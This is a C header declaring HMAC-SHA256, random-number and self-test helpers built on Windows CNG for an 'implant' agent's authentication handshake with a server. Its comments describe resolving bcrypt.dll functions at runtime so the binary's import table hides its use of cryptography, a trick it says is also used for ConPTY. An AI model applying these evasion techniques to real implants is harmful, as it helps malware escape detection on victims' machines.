/* ngcrypt.h - Windows CNG (BCrypt) primitives for the implant handshake.
 *
 * Deliberately narrow: HMAC-SHA256 and a CSPRNG, and nothing else. There is no
 * asymmetric cryptography here, and that is a considered decision rather than a
 * simplification. The handshake used to run ECDH P-256 with the identity
 * persisted as a CNG private blob, which means re-importing that blob on every
 * start. On this host CNG will export an ECC blob and then refuse to accept it
 * back, so the agent could never recover its key across a restart. A pre-shared
 * HMAC secret removes the dependency entirely.
 *
 * bcrypt.dll is loaded at runtime and every entry point is resolved through
 * GetProcAddress, so the agent gains no static import on bcrypt.dll. That is
 * the same trick already used for ConPTY, and it keeps the binary's import
 * table from advertising that it does cryptography.
 */
#ifndef NGCRYPT_H
#define NGCRYPT_H

#include <windows.h>

/* The shared secret. 32 bytes of CSPRNG output, the same width an HMAC-SHA256
   block key wants, so it is used directly with no stretching. */
#define NG_SECRET_BYTES 32
#define NG_PROOF_BYTES  32

/* Domain separation. These must match server/identity.js byte for byte: a
   client proof presented as a server proof is a reflection attack, and the only
   thing preventing it is that the labels differ. */
#define NG_LABEL_CLIENT "forzer/client/v1"
#define NG_LABEL_SERVER "forzer/server/v1"

/* 1 if bcrypt.dll loaded and every entry point resolved. */
int ng_available(void);

/* HMAC-SHA256 over label || nonce with the shared secret as key. */
int ng_proof(const BYTE *secret, const char *label, const BYTE *nonce,
             DWORD nonce_len, BYTE *out);

/* Raw HMAC-SHA256. ng_proof() is the only caller in this repository. */
int ng_hmac(const BYTE *key, DWORD key_len, const BYTE *msg, DWORD msg_len, BYTE *out);

/* Constant-time equality. 1 if equal, 0 otherwise. */
int ng_equal(const BYTE *a, const BYTE *b, DWORD n);

/* Cryptographically secure bytes. Used to mint the shared secret on first run. */
int ng_random(BYTE *buf, DWORD n);

/* Known-answer test against vectors produced independently with OpenSSL
   (Node's crypto). Returns 1 on success and prints what differed on failure, so
   a broken CNG call is caught on the first run instead of turning into a
   handshake that silently never authenticates. */
int ng_selftest(void);

#endif /* NGCRYPT_H */
